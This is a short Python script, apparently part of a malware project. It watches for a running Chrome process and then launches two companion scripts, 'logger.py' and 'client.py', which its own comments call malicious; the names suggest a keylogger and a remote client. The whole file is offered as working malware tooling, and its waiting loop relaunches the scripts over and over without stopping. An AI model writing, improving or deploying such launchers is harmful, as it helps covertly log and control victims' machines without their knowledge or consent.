import psutil
import os

# This function will check for processes
def check(processName):
	for proc in psutil.process_iter():
		try:
			if processName.lower() in proc.name().lower():
				return True
		except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
			pass
	return False;

# If chrome is already started, the program will run the malicious scripts

if check('chrome'):
	print("[*] Running")
	os.system("python3 logger.py & python3 client.py")

# If chrome is not open yet, the program will wait for it to start then start the malicious scripts

else:
	print("[*] Waiting for chrome to start...")
	while True:
		if check('chrome'):
			os.system('python3 logger.py & python3 client.py')
